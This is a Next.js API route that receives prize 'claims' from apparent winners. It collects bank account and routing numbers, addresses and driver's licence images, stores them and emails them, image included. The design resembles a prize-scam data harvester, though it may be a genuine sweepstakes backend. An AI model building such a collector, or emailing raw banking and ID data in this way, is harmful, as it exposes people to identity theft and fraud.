import { NextRequest, NextResponse } from "next/server"
import { addClaim } from "@/lib/db"
import { sendClaimNotification } from "@/lib/email"

export const config = {
  api: {
    bodyParser: {
      sizeLimit: "15mb",
    },
  },
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json()
    const { winnerId, method, uniqueCode, amount, driversLicenseImage } = body

    // Validate based on method
    if (method === "cashier_check") {
      const { fullName, address, driversLicense, email } = body
      if (!fullName || !address || !driversLicense || !email) {
        return NextResponse.json(
          { success: false, error: "All required fields must be filled" },
          { status: 400 }
        )
      }
    } else if (method === "electronic_deposit") {
      const { fullName, accountNumber, routingNumber, homeAddress, bankAddress, bankName, email } = body
      if (!fullName || !accountNumber || !routingNumber || !homeAddress || !bankAddress || !bankName || !email) {
        return NextResponse.json(
          { success: false, error: "All required fields must be filled" },
          { status: 400 }
        )
      }
    }

    // Store claim data (exclude large base64 image from DB, keep a flag)
    const dbData = { ...body }
    delete dbData.driversLicenseImage
    dbData.hasDriversLicense = !!driversLicenseImage

    const claim = await addClaim({
      winnerId: winnerId || "unknown",
      method: method || "unknown",
      uniqueCode: uniqueCode || "",
      amount: amount || "0",
      data: dbData,
    })

    // Send email notification with DL image (non-blocking)
    sendClaimNotification({
      ...body,
      uniqueCode,
      method,
    }).catch(
      (err) => console.error("Email notification failed:", err)
    )

    return NextResponse.json({ success: true, claimId: claim.id, uniqueCode })
  } catch {
    return NextResponse.json(
      { success: false, error: "Server error" },
      { status: 500 }
    )
  }
}
